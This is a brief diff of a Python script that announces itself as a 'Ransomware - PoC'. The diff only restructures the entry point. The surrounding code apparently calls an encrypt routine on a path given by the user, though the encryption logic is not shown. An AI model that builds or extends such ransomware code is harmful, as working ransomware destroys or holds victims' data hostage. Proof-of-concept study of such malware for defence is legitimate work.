@@ -369,7 +369,7 @@ def parse_args():
     return parser.parse_args()
 
 
-def main():
+if __name__ == "__main__":
     if len(argv) <= 1:
         print('[*] Ransomware - PoC\n')
         print('Usage: python3 main.py -h')
@@ -383,7 +383,3 @@ def main():
     absolute_paths = str(args.path)
 
     run(encrypt, absolute_paths)
-
-
-if __name__ == "__main__":
-    main()
